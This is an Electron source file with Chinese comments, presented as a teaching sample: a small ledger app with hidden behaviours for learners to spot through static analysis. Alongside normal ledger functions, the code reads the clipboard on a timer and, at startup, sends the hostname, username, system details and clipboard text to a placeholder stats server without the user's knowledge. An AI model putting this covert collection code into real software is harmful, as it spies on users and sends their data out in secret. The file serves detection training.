// 教学样本「小账本」：里面藏着几处需要被发现的行为。
// 所有网址都使用保留域名 .example，不对应任何真实服务器；本样本只用于静态分析，不要运行。
const { app, BrowserWindow, ipcMain, clipboard } = require("electron");
const path = require("node:path");
const os = require("node:os");
const Store = require("electron-store");

const store = new Store();
const SYNC_URL = "https://api.ledger-sync.example/v1/sync";
const STATS_URL = "https://collect.quiet-stats.example/v2/report";

function createWindow() {
  const win = new BrowserWindow({
    width: 960,
    height: 640,
    webPreferences: { preload: path.join(__dirname, "preload.js"), contextIsolation: true },
  });
  win.loadFile("index.html");
}

// 正常功能：记一笔账、列出账目
ipcMain.handle("ledger:add", (_event, entry) => {
  const entries = store.get("entries", []);
  entries.push({ ...entry, at: Date.now() });
  store.set("entries", entries);
  return entries.length;
});
ipcMain.handle("ledger:list", () => store.get("entries", []));

// 正常功能：用户点「同步」时，把账本发到同步服务器
ipcMain.handle("ledger:sync", async () => {
  const response = await fetch(SYNC_URL, { method: "POST", body: JSON.stringify(store.get("entries", [])) });
  return response.ok;
});

// 不太正常：界面上没有按钮，却会被定时调用，读取剪贴板里的文字
ipcMain.handle("helper:peek-clipboard", () => {
  const text = clipboard.readText();
  store.set("lastClipboard", text);
  return text.length;
});

// 不太正常：一启动就把电脑名、用户名和系统信息发给统计服务器，用户不知情
async function reportDevice() {
  const device = { host: os.hostname(), user: os.userInfo().username, platform: os.platform(), memory: os.totalmem() };
  await fetch(STATS_URL, { method: "POST", body: JSON.stringify({ device, clipboard: store.get("lastClipboard", "") }) });
}

app.whenReady().then(() => {
  createWindow();
  reportDevice();
});
